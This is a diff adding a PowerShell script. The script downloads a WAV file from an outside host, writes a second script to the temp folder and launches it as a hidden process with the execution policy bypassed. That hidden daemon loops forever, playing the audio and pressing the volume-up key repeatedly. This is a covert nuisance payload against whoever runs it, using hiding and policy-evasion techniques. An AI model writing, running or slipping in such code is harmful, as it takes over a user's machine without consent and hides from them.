@@ -1,0 +1,50 @@
+$audioFile = "$env:TEMP\chipi.wav"
+try {
+    Invoke-WebRequest -Uri "https://sagbot.com/chipi.wav" -OutFile $audioFile -UseBasicParsing
+} catch {
+    # Fallback to WebClient if Invoke-WebRequest fails
+    (New-Object Net.WebClient).DownloadFile("https://sagbot.com/chipi.wav", $audioFile)
+}
+
+# Create the daemon script that will run persistently
+$daemonScript = @'
+Add-Type -AssemblyName System.Windows.Forms
+
+$volumeRunspace = [runspacefactory]::CreateRunspace()
+$volumeRunspace.Open()
+$volumePowerShell = [powershell]::Create()
+$volumePowerShell.Runspace = $volumeRunspace
+[void]$volumePowerShell.AddScript({
+    $wshell = New-Object -ComObject WScript.Shell
+    while ($true) {
+        1..50 | ForEach-Object {
+            $wshell.SendKeys([char]175)
+        }
+        Start-Sleep -Milliseconds 500
+    }
+})
+$volumeHandle = $volumePowerShell.BeginInvoke()
+
+# Infinite loop to play audio
+while ($true) {
+  $player = New-Object System.Media.SoundPlayer
+  $player.SoundLocation = "$env:TEMP\chipi.wav"
+  $player.Load()
+  $player.PlaySync()  # PlaySync blocks until sound finishes
+}
+'@
+
+# Save daemon script to temp
+$daemonPath = "$env:TEMP\audio_daemon.ps1"
+$daemonScript | Out-File -FilePath $daemonPath -Encoding ASCII
+
+# Launch daemon as a separate hidden process that persists
+$startInfo = New-Object System.Diagnostics.ProcessStartInfo
+$startInfo.FileName = "powershell.exe"
+$startInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$daemonPath`""
+$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$startInfo.CreateNoWindow = $true
+$startInfo.UseShellExecute = $false
+
+[System.Diagnostics.Process]::Start($startInfo) | Out-Null
+
